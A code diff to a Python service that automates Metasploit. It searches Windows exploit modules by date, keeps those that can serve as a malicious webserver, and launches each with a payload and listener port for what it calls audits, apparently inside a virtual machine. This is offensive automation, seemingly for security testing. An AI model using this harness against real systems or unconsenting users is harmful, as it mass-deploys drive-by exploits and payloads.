@@ -35,23 +35,38 @@ class MetasploitScriptHandlingService(IScriptHandlingService):
                 vbox_path=args.vbox_path, 
             )
 
-            search_results = self._get_browser_exploits(from_date=args.ms_from_date, to_date=args.ms_to_date)
-            self._logger.info(f"Found {len(search_results)} browser exploits.")
+            platform = "windows"
+            self._logger.info(f"Getting potential exploits from Metasploit (platform: {platform})...")
+            search_results = self._get_exploits(platform=platform, from_date=args.ms_from_date, to_date=args.ms_to_date)
+            self._logger.info(f"Found {len(search_results)} exploits.")
 
-            results_to_run = search_results
+            # Filter all unsupported modules
+            self._logger.info(f"Filtering out all unsupported modules...")
+            final_results: list[MetasploitSearchResult] = []
+            for search_result in search_results:
+                _, module_path = MetasploitHelper.get_module_type(search_result.fullname)
+                module = self._client.modules.use("exploit", module_path)
+
+                if not self._is_supported_module(module.options):
+                    self._logger.debug(f"Module {search_result.fullname} cannot automatically deploy as a malicious webserver. Skipping...")
+                else:            
+                    final_results.append(search_result)
+            self._logger.info(f"Found {len(final_results)} potential exploits.")
+
+            # Configure total runs
+            results_to_run = final_results
             if args.max_url:
-                results_to_run = search_results[:args.max_url]
+                results_to_run = final_results[:args.max_url]
             self._logger.info(f"Launching {len(results_to_run)} audits...")
             
+            # Run audits
             for result in results_to_run:
                 server_metadata = self._deploy_malicious_webserver(module_fullname=result.fullname, 
                                                                 host=args.ms_host, 
                                                                 lport=args.ms_lport,
                                                                 srvport=args.ms_srvport,
                                                                 payload=args.ms_payload)
-                if server_metadata is None:
-                    continue
-                self._logger.info(f"{result.fullname} with payload/{args.ms_payload} (Job ID: {server_metadata.job_id}). Server started! Target URL: {server_metadata.url}")
+                self._logger.info(f"{result.fullname} ({result.disclosuredate}) (Job ID: {server_metadata.job_id}). Server started! Target URL: {server_metadata.url}")
                 self._logger.debug(self._client.jobs.info(server_metadata.job_id))
 
                 # Configure options for an audit
@@ -90,20 +105,15 @@ class MetasploitScriptHandlingService(IScriptHandlingService):
     def _deploy_malicious_webserver(self, module_fullname: str, 
                                     host: str = DEFAULT_MS_HOST, lport: int = DEFAULT_MS_LPORT,
                                     srvhost: str = DEFAULT_MS_SRVHOST, srvport: int = DEFAULT_MS_SRVPORT, 
-                                    uri_path: str = DEFAULT_MS_URIPATH, payload: str = DEFAULT_MS_PAYLOAD) -> MaliciousWebServerMetadata | None:
+                                    uri_path: str = DEFAULT_MS_URIPATH, payload: str = DEFAULT_MS_PAYLOAD) -> MaliciousWebServerMetadata:
         if self._client is None:
             raise ValueError("Metasploit client not initialized.")
         
         # Configure the exploit
         _, module_path = MetasploitHelper.get_module_type(module_fullname)
-        exploit_module = self._client.modules.use("exploit", module_path)
+        execute_module = self._client.modules.use("exploit", module_path)
 
-        support_options = ['SRVHOST', 'SRVPORT', 'URIPATH'] # Requires to deploy webserver automatically
-        is_supported = all(option in exploit_module.options for option in support_options)
-        if not is_supported:
-            self._logger.info(f"Exploit {module_fullname} cannot automatically deploy as a malicious webserver. Skipping...")
-            return None
-        exploit_module.update({
+        execute_module.update({
             'SRVHOST': srvhost,
             'SRVPORT': srvport,
             'URIPATH': uri_path,
@@ -117,7 +127,7 @@ class MetasploitScriptHandlingService(IScriptHandlingService):
         payload_module['LPORT'] = lport
 
         # Execute the exploit
-        execution_result = exploit_module.execute(payload=payload_module)
+        execution_result = execute_module.execute(payload=payload_module)
 
         job_id = execution_result['job_id']
         if job_id is None:
@@ -132,21 +142,30 @@ class MetasploitScriptHandlingService(IScriptHandlingService):
             payload=payload
         )
 
+    def _is_supported_module(self, module_options: list[str]):
+        supported_opts = ['SRVHOST', 'SRVPORT', 'URIPATH'] # Requires to deploy webserver automatically
+        contains_all_supported_opts = all(option in module_options for option in supported_opts)
 
-    def _get_browser_exploits(self, platform: str = 'windows', from_date: datetime.datetime | None = None, to_date: datetime.datetime | None = None):
+        unsupported_opts = ['RHOST', 'RHOSTS', 'RPORT']
+        contains_any_unsupported_opts = any(option in module_options for option in unsupported_opts)
+
+        return contains_all_supported_opts and not contains_any_unsupported_opts
+
+    def _get_exploits(self, platform: str = 'windows', from_date: datetime.datetime | None = None, to_date: datetime.datetime | None = None):
         if self._client is None:
             raise ValueError("Metasploit client not initialized.")
 
         # Search specifically for browser-based exploits
-        raw_results = self._client.call('module.search', [f'type:exploit browser platform:{platform}'])
-        browser_results: list[MetasploitSearchResult] = [MetasploitSearchResult(**e) for e in raw_results if type(e) is dict]
+        raw_results = self._client.call('module.search', [f'type:exploit platform:{platform}'])
+        results: list[MetasploitSearchResult] = [MetasploitSearchResult(**e) for e in raw_results if type(e) is dict]
 
         # Sort and filter as before
-        sorted_browser_exploits = sorted(browser_results, key=lambda x: x.disclosuredate, reverse=True)
+        sorted_results = sorted(results, key=lambda x: x.disclosuredate, reverse=True)
 
         # Filter by date if provided
         if from_date is not None:
-            sorted_browser_exploits = [e for e in sorted_browser_exploits if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") >= from_date]
+            sorted_results = [e for e in sorted_results if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") >= from_date]
         if to_date is not None:
-            sorted_browser_exploits = [e for e in sorted_browser_exploits if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") <= to_date]
-        return sorted_browser_exploits
+            sorted_results = [e for e in sorted_results if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") <= to_date]
+                
+        return sorted_results
